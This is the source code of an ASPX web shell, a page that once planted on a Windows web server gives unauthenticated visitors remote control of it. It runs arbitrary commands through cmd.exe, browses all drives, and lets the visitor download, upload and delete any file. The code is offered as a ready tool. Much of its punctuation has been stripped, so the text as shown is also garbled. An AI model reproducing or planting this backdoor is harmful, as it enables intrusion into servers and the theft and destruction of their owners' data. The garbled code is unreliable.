%-- ASPX Shell by LT lt@mac.hush.com (2007) --%
%@ Page Language=C# EnableViewState=false %
%@ Import Namespace=System.Web.UI.WebControls %
%@ Import Namespace=System.Diagnostics %
%@ Import Namespace=System.IO %

%
	string outstr = ;
	
	 get pwd
	string dir = Page.MapPath(.) + ;
	if (Request.QueryString[fdir] != null)
		dir = Request.QueryString[fdir] + ;
	dir = dir.Replace(, );
	dir = dir.Replace(, );
	
	 build nav for path literal
	string[] dirparts = dir.Split('');
	string linkwalk = ;	
	foreach (string curpart in dirparts)
	{
		if (curpart.Length == 0)
			continue;
		linkwalk += curpart + ;
		outstr += string.Format(a href='fdir={0}'{1}a&nbsp;,
									HttpUtility.UrlEncode(linkwalk),
									HttpUtility.HtmlEncode(curpart));
	}
	lblPath.Text = outstr;
	
	 create drive list
	outstr = ;
	foreach(DriveInfo curdrive in DriveInfo.GetDrives())
	{
		if (!curdrive.IsReady)
			continue;
		string driveRoot = curdrive.RootDirectory.Name.Replace(, );
		outstr += string.Format(a href='fdir={0}'{1}a&nbsp;,
									HttpUtility.UrlEncode(driveRoot),
									HttpUtility.HtmlEncode(driveRoot));
	}
	lblDrives.Text = outstr;

	 send file 
	if ((Request.QueryString[get] != null) && (Request.QueryString[get].Length  0))
	{
		Response.ClearContent();
		Response.WriteFile(Request.QueryString[get]);
		Response.End();
	}

	 delete file 
	if ((Request.QueryString[del] != null) && (Request.QueryString[del].Length  0))
		File.Delete(Request.QueryString[del]);	

	 receive files 
	if(flUp.HasFile)
	{
		string fileName = flUp.FileName;
		int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '', '' });
		if (splitAt = 0)
			fileName = flUp.FileName.Substring(splitAt);
		flUp.SaveAs(dir +  + fileName);
	}

	 enum directory and generate listing in the right pane
	DirectoryInfo di = new DirectoryInfo(dir);
	outstr = ;
	foreach (DirectoryInfo curdir in di.GetDirectories())
	{
		string fstr = string.Format(a href='fdir={0}'{1}a,
									HttpUtility.UrlEncode(dir +  + curdir.Name),
									HttpUtility.HtmlEncode(curdir.Name));
		outstr += string.Format(trtd{0}tdtd&lt;DIR&gt;tdtdtdtr, fstr);
	}
	foreach (FileInfo curfile in di.GetFiles())
	{
		string fstr = string.Format(a href='get={0}' target='_blank'{1}a,
									HttpUtility.UrlEncode(dir +  + curfile.Name),
									HttpUtility.HtmlEncode(curfile.Name));
		string astr = string.Format(a href='fdir={0}&del={1}'Dela,
									HttpUtility.UrlEncode(dir),
									HttpUtility.UrlEncode(dir +  + curfile.Name));
		outstr += string.Format(trtd{0}tdtd{1d}tdtd{2}tdtr, fstr, curfile.Length  1024, astr);
	}
	lblDirOut.Text = outstr;

	 exec cmd 
	if (txtCmdIn.Text.Length  0)
	{
		Process p = new Process();
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.FileName = cmd.exe;
		p.StartInfo.Arguments = c  + txtCmdIn.Text;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.WorkingDirectory = dir;
		p.Start();

		lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
		txtCmdIn.Text = ;
	}	
%

!DOCTYPE html PUBLIC -W3CDTD XHTML 1.0 TransitionalEN httpwww.w3.orgTRxhtml1DTDxhtml1-transitional.dtd

html xmlns=httpwww.w3.org1999xhtml 
head
	titleASPX Shelltitle
	style type=textcss
		 { font-family Arial; font-size 12px; }
		body { margin 0px; }
		pre { font-family Courier New; background-color #CCCCCC; }
		h1 { font-size 16px; background-color #00AA00; color #FFFFFF; padding 5px; }
		h2 { font-size 14px; background-color #006600; color #FFFFFF; padding 2px; }
		th { text-align left; background-color #99CC99; }
		td { background-color #CCFFCC; }
		pre { margin 2px; }
	style
head
body
	h1ASPX Shell by LTh1
    form id=form1 runat=server
    table style=width 100%; border-width 0px; padding 5px;
		tr
			td style=width 50%; vertical-align top;
				h2Shellh2				
				aspTextBox runat=server ID=txtCmdIn Width=300 
				aspButton runat=server ID=cmdExec Text=Execute 
				preaspLiteral runat=server ID=lblCmdOut Mode=Encode pre
			td
			td style=width 50%; vertical-align top;
				h2File Browserh2
				p
					Drivesbr 
					aspLiteral runat=server ID=lblDrives Mode=PassThrough 
				p
				p
					Working directorybr 
					baspLiteral runat=server ID=lblPath Mode=passThrough b
				p
				table style=width 100%
					tr
						thNameth
						thSize KBth
						th style=width 50pxActionsth
					tr
					aspLiteral runat=server ID=lblDirOut Mode=PassThrough 
				table
				pUpload to this directorybr 
				aspFileUpload runat=server ID=flUp 
				aspButton runat=server ID=cmdUpload Text=Upload 
				p
			td
		tr
    table

    form
body
html
